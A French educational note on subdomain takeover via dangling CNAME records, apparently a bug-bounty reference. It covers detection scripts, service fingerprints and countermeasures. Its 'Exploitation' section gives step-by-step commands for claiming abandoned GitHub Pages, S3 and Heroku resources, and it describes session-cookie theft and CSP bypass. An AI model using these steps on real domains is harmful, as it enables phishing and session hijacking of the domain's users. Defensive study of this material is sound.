---
title: Subdomain Takeover
domain: sciences-appliquées
subdomain: informatique / sécurité / web
tags: [subdomain-takeover, dns, cname, reconnaissance, sécurité, web, bug-bounty]
date: 2026-03-22
---

# Subdomain Takeover

Le subdomain takeover se produit quand un sous-domaine pointe (via CNAME) vers un service externe qui n'est plus actif. Un attaquant peut alors revendiquer ce service et prendre le contrôle du sous-domaine.

## Mécanisme

```
Situation normale :
  staging.victim.com  CNAME  victim.azurewebsites.net
  → victim.azurewebsites.net est actif → staging.victim.com fonctionne

Situation vulnérable :
  staging.victim.com  CNAME  victim.azurewebsites.net
  → victim.azurewebsites.net a été supprimé (fin de projet, oubli)
  → L'enregistrement CNAME reste dans le DNS de victim.com

Takeover :
  L'attaquant crée un compte Azure et réclame victim.azurewebsites.net
  → staging.victim.com pointe maintenant vers le contenu de l'attaquant
  → Impact : phishing, vol de cookies de session, XSS stocké
```

## Services vulnérables courants

| Service | Indicateur de vulnérabilité | Notes |
|---|---|---|
| GitHub Pages | `There isn't a GitHub Pages site here` | Créer le repo et activer Pages |
| Azure (App Service) | `404 Web Site not found` / `azurewebsites.net` | Réclamer le nom d'app |
| Heroku | `No such app` | Créer une app Heroku avec ce nom |
| AWS S3 | `NoSuchBucket` | Créer le bucket avec ce nom |
| Fastly | `Fastly error: unknown domain` | Configurer le domaine |
| Shopify | `Sorry, this shop is currently unavailable` | Créer un shop |
| Zendesk | `Help Center Closed` | Créer un compte Zendesk |
| Tumblr | `There's nothing here` | Créer un blog Tumblr |
| Ghost | `The thing you were looking for is no longer here` | Créer un blog Ghost |
| Surge.sh | `project not found` | Créer un projet Surge |
| Pantheon | `404 error unknown site!` | Créer un site Pantheon |

## Détection

```bash
# Méthode manuelle — vérifier si le CNAME pointe vers un service actif
dig CNAME staging.victim.com
# → victim.azurewebsites.net

curl -s https://staging.victim.com
# → "There isn't a GitHub Pages site here" → vulnérable !

# Vérifier si le service externe est réclamable
curl -s https://victim.azurewebsites.net
# → 404 "Web Site not found" → azurewebsites.net libre à réclamer

# Automatisation avec subjack
go install github.com/haccer/subjack@latest
subjack -w subdomains.txt -t 100 -timeout 30 -ssl -o results.txt

# nuclei — templates takeover
cat subdomains.txt | nuclei -tags takeover -o takeover_results.txt

# can-i-take-over-xyz (liste de référence)
# https://github.com/EdOverflow/can-i-take-over-xyz
# Contient les fingerprints et instructions pour chaque service
```

```python
# Script de détection simple
import dns.resolver
import requests

FINGERPRINTS = {
    "azurewebsites.net": "Web Site not found",
    "github.io": "There isn't a GitHub Pages site here",
    "s3.amazonaws.com": "NoSuchBucket",
    "herokuapp.com": "No such app",
    "shopify.com": "Sorry, this shop is currently unavailable",
}

def check_takeover(subdomain):
    try:
        answers = dns.resolver.resolve(subdomain, 'CNAME')
        cname = str(answers[0].target)
        for service, fingerprint in FINGERPRINTS.items():
            if service in cname:
                try:
                    r = requests.get(f"https://{subdomain}", timeout=5, verify=False)
                    if fingerprint in r.text:
                        print(f"[VULN] {subdomain} → {cname} (takeover possible)")
                        return True
                except:
                    pass
    except:
        pass
    return False
```

## Exploitation

### GitHub Pages

```bash
# 1. Vérifier que le CNAME pointe vers <user>.github.io ou <org>.github.io
dig CNAME docs.victim.com
# → victim-corp.github.io

# 2. Le repo victim-corp.github.io a été supprimé
curl https://victim-corp.github.io
# → 404

# 3. Créer un compte GitHub "victim-corp" (si le username est disponible)
# 4. Créer un repo "victim-corp.github.io"
# 5. Activer GitHub Pages
# 6. docs.victim.com → sert maintenant notre contenu
```

### AWS S3

```bash
# 1. CNAME pointe vers un bucket S3 supprimé
dig CNAME static.victim.com
# → victim-static.s3.amazonaws.com

# 2. Vérifier que le bucket est disponible
aws s3 ls s3://victim-static 2>&1
# → "NoSuchBucket"

# 3. Créer le bucket avec le même nom (dans la même région !)
aws s3 mb s3://victim-static --region us-east-1

# 4. Configurer le bucket pour l'hébergement web
aws s3 website s3://victim-static --index-document index.html

# 5. Publier du contenu
echo "<html>Takeover réussi</html>" | aws s3 cp - s3://victim-static/index.html --acl public-read

# static.victim.com pointe maintenant vers notre bucket
```

### Heroku

```bash
# 1. CNAME vers app.herokuapp.com supprimée
# 2. Créer une app Heroku avec exactement ce nom
heroku create victim-app  # → victim-app.herokuapp.com

# 3. Déployer du contenu sur l'app
# api.victim.com → notre app Heroku
```

## Impact

```
Impact d'un takeover réussi :

1. Phishing crédible
   → Le sous-domaine appartient au domaine de la victime (victim.com)
   → Les utilisateurs font confiance à "staging.victim.com"
   → Formulaires de connexion malveillants hébergés sur un domaine légitime

2. Vol de cookies de session
   → Si les cookies sont définis avec Domain=.victim.com
   → Les cookies sont envoyés à staging.victim.com (notre contrôle)
   → Récupération des sessions utilisateurs

3. Bypass CSP
   → Si staging.victim.com est dans la Content-Security-Policy de victim.com
   → script-src https://staging.victim.com → on peut charger des scripts malveillants
   → XSS persistant via CSP bypass

4. XSS via CORS
   → Si victim.com autorise les requêtes CORS depuis *.victim.com
   → staging.victim.com peut lire les réponses de l'API victim.com

5. DMARC bypass (pour les sous-domaines email)
   → Envoyer des emails depuis le sous-domaine avec une réputation établie
```

## Contre-mesures

```bash
# Audit régulier des enregistrements DNS
# Comparer les CNAMEs avec les services actifs

# Script de monitoring
dig +short CNAME staging.example.com | xargs -I{} curl -s https://{} | grep -i "not found\|no such"

# Supprimer les enregistrements DNS avant de supprimer le service
# (ne jamais laisser un CNAME orphelin)

# Rotation régulière des DNS — audit trimestriel des sous-domaines

# Nettoyer les CNAMEs lors de la décommission d'un service :
# 1. Supprimer l'enregistrement DNS CNAME
# 2. Puis supprimer le service externe
# (jamais l'inverse)
```
